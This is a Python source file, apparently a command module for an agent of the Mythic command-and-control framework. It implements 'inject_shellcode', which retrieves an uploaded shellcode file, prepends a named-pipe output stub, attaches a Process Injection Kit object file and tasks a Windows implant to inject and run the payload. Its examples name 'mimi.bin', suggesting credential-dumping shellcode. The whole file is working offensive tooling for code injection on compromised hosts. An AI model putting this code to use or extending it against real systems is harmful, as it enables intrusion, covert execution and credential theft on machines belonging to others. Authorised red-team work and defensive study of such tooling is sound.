from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging, sys
from .utils.agent_global_settings import PROCESS_INJECT_KIT

'''
    [BRIEF]
    
    This command is not designed to be used directly although it can be.
    It does the following:
        - Takes a PIC (shellcode) file as input
        - Checks if there is a Process Inject Kit registered
        - Sends PIC and Kit (optional) to Agent for injection
    
    [Input]: 
        - File (shellcode)
    [Output]:
        - {typedlist} [bytes:shellcode_contents] Contents of PIC input file
        - {typedlist} [bytes:kit_spawn_contents] Contents of Process Injection Kit BOF 
'''

logging.basicConfig(level=logging.INFO)

class InjectShellcodeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # This is designed to be passed from other commands with MythicRPCTaskCreateSubtaskMessage
            CommandParameter(
                name="shellcode_file",
                cli_name="File",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="A shellcode file uploaded to Mythic.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="Existing", 
                        ui_position=1,
                    )
                ]
            ),
            # CommandParameter(
            #     name="method",
            #     cli_name="-method",
            #     display_name="Inject Method",
            #     type=ParameterType.ChooseOne,
            #     default_value="default",
            #     choices=[
            #         "kit",
            #         "default"
            #     ],
            #     description="Process injection method used to execute the shellcode. (e.g., default|kit)",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=False, 
            #             group_name="Existing", 
            #             ui_position=2,
            #         )
            #     ]
            # ),
            
            # This will be set Globally, so dont make it an option
            # CommandParameter(
            #     name="process_inject_kit_file",
            #     cli_name="-kit",
            #     display_name="Injection Kit",
            #     type=ParameterType.File,
            #     description="Custom Process Inject Kit BOF file. This gets passed as a Mythic File UUID",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=False,
            #             group_name="Existing", 
            #             ui_position=3,
            #         )
            #     ]
            # ),
            
            # CommandParameter(
            #     name="shellcode_name",
            #     cli_name="File",
            #     display_name="File",
            #     type=ParameterType.ChooseOne,
            #     dynamic_query_function=self.get_files,
            #     description="Already existing PIC Shellcode to execute (e.g. mimi.bin)",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=True,
            #             group_name="Existing",
            #             ui_position=1
            #         )
            #     ]),
            # CommandParameter(
            #     name="shellcode_file",
            #     cli_name="File",
            #     display_name="New File",
            #     type=ParameterType.File,
            #     description="A new PIC shellcode to execute. After uploading once, you can just supply the -File parameter",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=True, 
            #             group_name="New File", 
            #             ui_position=1,
            #         )
            #     ]
            # )            
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".bin"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        pass
        
class InjectShellcodeCommand(CommandBase):
    cmd = "inject_shellcode"
    needs_admin = False
    help_cmd = "inject_shellcode -File [mimi.bin] --method [default|custom] --kit [file.o]"
    description = "Execute PIC shellcode. (e.g., inject_shellcode -File mimi.bin --method default --kit inject_spawn.x64.o"
    version = 1
    author = "@c0rnbread"
    attackmapping = []
    argument_class = InjectShellcodeArguments
    attributes = CommandAttributes(
        builtin=False,
        dependencies=["inline_execute"],
        supported_os=[ SupportedOS.Windows ],
        suggested_command=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            ######################################
            #                                    #
            #   Group (New File | Existing)      #
            #                                    #
            ######################################
            groupName = taskData.args.get_parameter_group_name()
            method = "kit"
        
            # Check if Default Process Injection Kit was built yet
            if not PROCESS_INJECT_KIT.get_inject_spawn() or not PROCESS_INJECT_KIT.get_inject_explicit():
                await PROCESS_INJECT_KIT.build_default(taskData.Task.ID)
            
            # Assuming existing shellcode file was passed
            if groupName == "Existing":
                shellcode_file_id = taskData.args.get_arg("shellcode_file")
                
                # Retrieve the shellcode file to inject
                logging.info(f"Selecting shellcode file to inject. Mythic File UUID: {shellcode_file_id}")

                shellcode_contents = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=shellcode_file_id)
                    )
                
                if not shellcode_contents.Success:
                    raise Exception("Failed to fetch find file from Mythic (ID: {})".format(shellcode_file_id))
                
                logging.info("Prepending Named Pipe Stub for Output.")
                
                # Prepend Named Pipe stub (to set stdout/stderr for process)
                named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
                with open(named_pipe_stub_path, 'rb') as f:
                    stub_bytes = f.read()
                prefixed_shellcode = stub_bytes + shellcode_contents.Content
                
                # Use TypedArray format to send raw bytes (same format as kit bytes)
                shellcode_typed_array = [["bytes", prefixed_shellcode.hex()]]
                taskData.args.add_arg("shellcode_bytes", shellcode_typed_array, type=ParameterType.TypedArray, parameter_group_info=[ParameterGroupInfo(
                    group_name="Existing"
                )])

                # Add raw contents of process inject kit to command tasking
                if method == "kit":
                    kit_spawn_uuid = PROCESS_INJECT_KIT.get_inject_spawn()
                    if not kit_spawn_uuid:
                        raise Exception("Failed to get UUID for Process Injection Kit. Have you run register_process_injection_kit yet??")
                    # Send BOF contents to Agent
                    kit_spawn_file = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=kit_spawn_uuid)
                    )
                    if not kit_spawn_file.Success:
                        raise Exception("Failed to fetch find file from Mythic (UUID: {})".format(kit_spawn_uuid))
                    
                    kit_spawn_contents = kit_spawn_file.Content
                    
                    kit_typed_array = [["bytes", kit_spawn_contents.hex()]]         # I'm only doing a typed-list cause its easier for my translation container to pack raw bytes
                    taskData.args.add_arg("kit_spawn_contents", kit_typed_array, type=ParameterType.TypedArray, parameter_group_info=[ParameterGroupInfo(
                        group_name="Existing"
                    )])
                    
                    logging.info(f"[PIK] Using Process Injection Kit.")
                    logging.info(f"[PIK] \t PROCESS_INJECT_SPAWN:{PROCESS_INJECT_KIT.get_inject_spawn()}")
                    logging.info(f"[PIK] \t PROCESS_INJECT_EXPLICIT:{PROCESS_INJECT_KIT.get_inject_explicit()}")

                
                response.DisplayParams = "-File {} --method {}".format(
                    shellcode_file_id,
                    method
                )

                taskData.args.remove_arg("shellcode_file")
            
            # Debugging
            # logging.info(taskData.args.to_json())
            
            return response

        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp